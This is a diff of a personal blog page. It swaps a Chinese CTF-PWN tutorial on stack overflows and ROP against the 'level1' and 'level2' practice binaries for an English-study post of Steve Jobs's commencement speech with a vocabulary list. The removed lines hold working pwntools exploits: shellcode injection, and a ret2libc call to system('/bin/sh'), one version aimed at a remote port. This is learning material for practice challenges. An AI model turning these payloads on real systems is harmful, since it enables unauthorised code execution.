@@ -4,8 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ROP_x86, Matrix">
-    <meta name="description" content="ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。Control Flow Hijack 程序流劫持比较常">
+    <meta name="keywords" content="Steve Jobs speech one, Matrix">
+    <meta name="description" content="
+Reasons of Dropping OutI am honored to be with you today for your commencement from one of the finest universities in t">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +14,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>ROP_x86 | Matrix</title>
+    <title>Steve Jobs speech one | Matrix</title>
     <link rel="icon" type="image/jpeg" href="/medias/matrix.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -197,13 +198,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('https://s1.ax1x.com/2020/09/13/w0tC80.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        ROP_x86
+                        Steve Jobs speech one
                     </div>
                 </div>
             </div>
@@ -295,8 +296,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/" target="_blank">
-                                <span class="chip bg-color">原理学习</span>
+                            <a href="/tags/Article/" target="_blank">
+                                <span class="chip bg-color">Article</span>
                             </a>
                         
                     </div>
@@ -307,8 +308,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CTF-PWN/" class="post-category" target="_blank">
-                                CTF-PWN
+                            <a href="/categories/English-Trainning/" class="post-category" target="_blank">
+                                English Trainning
                             </a>
                         
                     </div>
@@ -319,21 +320,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-04-23
+                    2020-09-13
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.5k
+                        561
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        5 分
+                        3 分
                     </div>
                     
                 
@@ -349,75 +350,22 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="ROP的全称为Return-oriented-programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。"><a href="#ROP的全称为Return-oriented-programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。" class="headerlink" title="ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。"></a>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</h2><h3 id="Control-Flow-Hijack-程序流劫持"><a href="#Control-Flow-Hijack-程序流劫持" class="headerlink" title="Control Flow Hijack 程序流劫持"></a>Control Flow Hijack 程序流劫持</h3><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。</p>
-<p>level1：无防护32位<br>ida伪代码：<br><img src="https://s1.ax1x.com/2020/05/23/YvFWpq.png" alt=""></p>
-<p>进入vulnerable（危险）函数：<br><img src="https://s1.ax1x.com/2020/05/23/YvFWpq.png" alt=""></p>
-<p>从char buf （后面的注释）这一段可知其大小大概为0x88+0x10.<br>下面的read函数256u表示允许读入256个字符，显然存在溢出。<br>进入buf：<br><img src="https://s1.ax1x.com/2020/05/23/YvkNbF.png" alt=""><br>所以（下面的没截下来）buf可放入0x88+0x8个字符（140），还可以通过调试进一步验证。</p>
-<h3 id="那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。"><a href="#那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。" class="headerlink" title="那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。"></a>那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。</h3><h2 id="调试："><a href="#调试：" class="headerlink" title="调试："></a>调试：</h2><p>在read函数时制造200个字符：<br><img src="https://s1.ax1x.com/2020/05/23/Yvksv6.png" alt=""></p>
-<p><img src="https://s1.ax1x.com/2020/05/23/YvkdUJ.png" alt=""></p>
-<p><img src="https://s1.ax1x.com/2020/05/23/YvkWUH.png" alt=""><br>所以140个字符+ret返回地址即可</p>
-<h3 id="现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）"><a href="#现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）" class="headerlink" title="现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）"></a>现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）</h3><p>由于各种玄学问题buf正真的地址不是我想的那样，这里我引用蒸米@阿里聚安全的原话：</p>
-<pre><code>  对初学者来说这个shellcode地址的位置其实是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置。但当你真的执行exp的时候你会发现shellcode压根就不在这个地址上！这是为什么呢？原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。</code></pre><p>解决方法：开启core dump功能。<br>指令：ulimit -c unlimited<br>   sudo sh -c ‘echo “/tmp/core.%t” &gt; /proc/sys/kernel/core_pattern’</p>
-<p>开启后，当运行程序出现内存错误时，系统会生成一个core dump文件在tmp目录下。然后我们用gdb查看该core文件，来推测buf真正的地址。</p>
-<p><img src="https://s1.ax1x.com/2020/05/23/YvkRVe.png" alt=""><br>接下来调试core文件：<br><img src="https://s1.ax1x.com/2020/05/23/Yvk4PA.png" alt=""><br>下面这一步我不太明白为啥是$esp-144得到buf地址。个人觉得应该是-140，如果不正确可以扩大范围<br><img src="https://s1.ax1x.com/2020/05/23/Yvkf5d.png" alt=""><br>将这里的字符串和我们之前造的字符串对比是一致的。所以可以知道我们输入的字符串放在0xffffd000这里。所以buf地址就是0xffffd000.可以写exp了。</p>
-<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#level1</span>
-
-
-sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"level1"</span><span class="token punctuation">)</span>
-
-context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">,</span> word_size<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span>
-
-shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">140</span><span class="token operator">-</span>len<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xffffcff0</span><span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true">#gdb.attach(sh)  ——这里启用的话可以进行调试。</span>
-
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p><img src="https://s1.ax1x.com/2020/05/23/YvkgbD.png" alt=""><br>成功！！</p>
-<h2 id="level2：NX开启，栈不可执行！"><a href="#level2：NX开启，栈不可执行！" class="headerlink" title="level2：NX开启，栈不可执行！"></a>level2：NX开启，栈不可执行！</h2><p>程序还是一样的就是在编译的时候开其NX保护机制。<br>那么像上面的方法将shellcode填入栈中，再用ret跳转到栈上执行shellcode的方法就不行了。</p>
-<p>小知识：ps指令查看进程（注意pid）<br><img src="https://s1.ax1x.com/2020/05/23/YvkD81.png" alt=""><br>如果你通过sudo cat /proc/[pid]/maps查看，你会发现level1的stack是rwx的，但是level2的stack却是rw的。<br><img src="https://s1.ax1x.com/2020/05/23/YvkcDO.png" alt=""></p>
-<h3 id="接下来由于各种基层问题我引用蒸米的原文-其实是我是辣鸡）："><a href="#接下来由于各种基层问题我引用蒸米的原文-其实是我是辣鸡）：" class="headerlink" title="接下来由于各种基层问题我引用蒸米的原文(其实是我是辣鸡）："></a>接下来由于各种基层问题我引用蒸米的原文(其实是我是辣鸡）：</h3><h4 id="我们知道level2调用了libc-so，并且libc-so里保存了大量可利用的函数，我们如果可以让程序执行system-“-bin-sh”-的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system-这个函数的地址以及”-bin-sh”这个字符串的地址。如果关掉了ASLR的话，system-函数在内存中的地址是不会变化的，并且libc-so中也包含”-bin-sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”-bin-sh”字符串的地址。"><a href="#我们知道level2调用了libc-so，并且libc-so里保存了大量可利用的函数，我们如果可以让程序执行system-“-bin-sh”-的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system-这个函数的地址以及”-bin-sh”这个字符串的地址。如果关掉了ASLR的话，system-函数在内存中的地址是不会变化的，并且libc-so中也包含”-bin-sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”-bin-sh”字符串的地址。" class="headerlink" title="我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。"></a>我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。</h4><p>步骤：<br>首先再main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中。<br>通过print system这个命令来获取system函数在内存中的位置。<br>通过print __libc_start_main这个命令获取libc.so在内存中的起始位置。<br>通过find命令查找/bin/sh这个字符串。</p>
-<p><img src="https://s1.ax1x.com/2020/05/23/YvkBCR.png" alt=""><br>图中字符串/bin/sh有两个一个实在libc中的另一个是出题者给的hint（这个在ida中的字符串也可以找到）两个都可以用。<br>可以写exp了：</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-
-<span class="token comment" spellcheck="true">#xctfpwn6 == rop level2</span>
-
-sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"level2"</span><span class="token punctuation">)</span>
-
-systemaddr <span class="token operator">=</span> <span class="token number">0xf7e19d10</span>
-binshaddr <span class="token operator">=</span> <span class="token number">0x804a024</span>
-ret <span class="token operator">=</span> <span class="token number">0x804a024</span>   
-
-<span class="token comment" spellcheck="true">#要注意的是system()后面跟的是执行完system函数后要返回地址，接下来才是”/bin/sh”字符串的地址。因为我们只需要执行system("/bin/sh")函数所以system的返回地址可任意。</span>
-
-payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>systemaddr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binshaddr<span class="token punctuation">)</span>
-
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p>连接到端口时脚本为：</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-
-context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>  <span class="token operator">//</span>虽然不是很明白，但加上这个是有点用处的，可以显示一些细节。
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>“level2"<span class="token punctuation">)</span> <span class="token operator">//</span> elf只是一个名字，level2是本地文件。
-sysaddr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">//</span> <span class="token punctuation">.</span>symbols是用来搜寻函数的，此处搜寻system的地址（在本地文件了level2中搜寻）
-!<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>s1<span class="token punctuation">.</span>ax1x<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">23</span><span class="token operator">/</span>Yvkrgx<span class="token punctuation">.</span>png<span class="token punctuation">)</span>
-binshaddr <span class="token operator">=</span> elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token punctuation">.</span>search 找字符串，汇编代码或者某个数值的地址。
-
-!<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>s1<span class="token punctuation">.</span>ax1x<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">23</span><span class="token operator">/</span>Yvkw59<span class="token punctuation">.</span>png<span class="token punctuation">)</span>
-
-payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sysaddr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binshaddr<span class="token punctuation">)</span>
-
-sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"******"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span>
-
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p>这里由ida字符串查看可知：<br><img src="https://s1.ax1x.com/2020/05/23/YvktDU.png" alt=""></p>
-<p>本地文件里包括system与/bin/sh，所以在使用相关搜索功能时可以查询到。</p>
+                <p><img src="https://s1.ax1x.com/2020/09/13/w0tC80.jpg" alt=""></p>
+<h2 id="Reasons-of-Dropping-Out"><a href="#Reasons-of-Dropping-Out" class="headerlink" title="Reasons of Dropping Out"></a>Reasons of Dropping Out</h2><p>I am honored to be with you today for your <strong>commencement</strong> from one of the finest universities in the world.<br>Truth be told, I never graduated from college. And this is the closest I’ve ever gotten to a college graduation.<br>Today I want to tell you three stories from my life. That’s it. No big deal. Just three stories.<br>The first story is about connecting the <strong>dots</strong>.<br>I dropped out of <strong>Reed College</strong> after the first six months, but then stayed around as a <strong>drop-in</strong> for another 18 months or so before I really quit.<br>So why did I <strong>drop out</strong>? It started before I was born. My <strong>biological mother</strong> was a young, <strong>unwed</strong> graduate student, and she decided to <strong>put me up for adoption</strong>.<br>She felt very strongly that I should be adopted by college graduates, so everything was all set for me to be adopted at birth by a lawyer and his wife. Except that when I <strong>popped</strong> out they decided for the last minute that they really wanted a girl.<br>So my parents, who were on a waiting list, got a call in the middle of the night asking: “We’ve got an unexpected baby boy; do you want him?” They said: “Of course.”<br>My biological mother found out later that my mother had never graduated from college and that my father had never graduated from high school. She refused to sign the final <strong>adoption</strong> papers.<br>She only <strong>relented</strong> a few months later when my parents promised that I would go to college. This was the start in my life.<br>And 17 years later I did go to college. But I <strong>naively</strong> chose a college that was almost as expensive as Stanford, and all of my working-class parents’ savings were being spent on my college tuition.<br>After six months, I couldn’t see the value in it. I had no idea what I wanted to do with my life and no idea how college was going to help me figure it out. And here I was spending all of the money my parents had saved their entire life.<br>So I decided to <strong>drop out</strong> and trust that it would all work out OK. It was pretty scary at the time, but looking back it was one of the best decisions I ever made.<br>The minute I dropped out I could stop taking the required classes that didn’t interest me, and begin <strong>dropping in</strong> on the ones that looked far more interesting.</p>
+<h3 id="Words-collection"><a href="#Words-collection" class="headerlink" title="Words collection"></a>Words collection</h3><ul>
+<li>commencement:n. 开始，发端；毕业典礼</li>
+<li>dot:n. 点，圆点；嫁妆 vt. 加小点于 vi. 打上点</li>
+<li>Reed College:里德学院</li>
+<li>drop-in:n. 非正式造访；不速之客（等于 dropper-in）</li>
+<li>drop out:退出；退学；脱离</li>
+<li>biologic mother:生母；亲生母亲</li>
+<li>unwed:adj. 未婚的；没有结婚的</li>
+<li>put up for:某物供（销售或拍卖）某人供（收养等）</li>
+<li>adoption:n. 采用；收养；接受</li>
+<li>relent:vi.变温和，变宽厚；减弱；缓和 vt. 使变温和；减轻</li>
+<li>naively: 天真地</li>
+<li>drop in: (有选择地)加入；愿意(或决心)参加：</li>
+</ul>
 
             </div>
             <hr/>
@@ -558,7 +506,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </span>
                     <a href="http://squarepants0.github.io" class="b-link-green">Matrix</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2020/04/23/rop-x86/" class="b-link-green">ROP_x86</a>
+                    <a href="/2020/09/13/steve-jobs-speech-one/" class="b-link-green">Steve Jobs speech one</a>
                 </p>
             </div>
         </div>
@@ -580,7 +528,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
         repo: 'Gitalks.github.io',
         owner: 'squarepants0',
         admin: "squarepants0",
-        id: '2020-04-23T13-10-37',
+        id: '2020-09-13T17-16-47',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -601,31 +549,73 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/05/16/xctf-jin-jie-pwn-warmup/">
+                <a href="/2020/09/13/steve-jobs-speech-one/">
                     <div class="card-image">
                         
+                        <img src="https://s1.ax1x.com/2020/09/13/w0tC80.jpg" class="responsive-img" alt="Steve Jobs speech one">
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="xctf进阶-pwn-warmup">
-                        
-                        <span class="card-title">xctf进阶-pwn-warmup</span>
+                        <span class="card-title">Steve Jobs speech one</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">这个提没有附件，被称为盲打，blind pwn
-黑箱测试之类的。
-linux连接尝试：
-因为没有关键提示，可以从溢出方面下手，这个地址很可能就是后门。
-exp爆破：
-from pwn import *
-#context.log_level </div>
+                    <div class="summary">
+Reasons of Dropping OutI am honored to be with you today for your commencement from one of the finest universities in t</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-05-16
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-09-13
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/English-Trainning/" class="post-category" target="_blank">
+                                    English Trainning
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Article/" target="_blank">
+                        <span class="chip bg-color">Article</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/09/13/xctf-challenge-notehack/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="XCTF-CHALLENGE-notehack">
+                        
+                        <span class="card-title">XCTF-CHALLENGE-notehack</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">别的不说，看我一手E技能点Q点点，破败接点点，芜湖 起飞~~。checksechunter@hunter:~/how2heap/my_heap/pwnable.tw hacknote$ checksec hacknote
+[*] '/hom</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-09-13
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -643,51 +633,6 @@ from pwn import *
                     
                     <a href="/tags/xctf-pwn-challenge/" target="_blank">
                         <span class="chip bg-color">xctf-pwn-challenge</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/04/23/elf-zhi-xing-quan-xian/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="ELF执行权限">
-                        
-                        <span class="card-title">ELF执行权限</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary">使用chmod命令：chmod用于管理文件或目录的权限，文件或目录权限的控制分别以读取(r)、写入(w)、执行(x)3种可读可写可执行，抽象的用二进制来表示 1 代表拥有该权限，0 代表没有该权限，这样我们就可以看到具有全部权限二进制可理解</div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-04-23
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/MASS/" class="post-category" target="_blank">
-                                    MASS
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/linux/" target="_blank">
-                        <span class="chip bg-color">linux</span>
                     </a>
                     
                 </div>
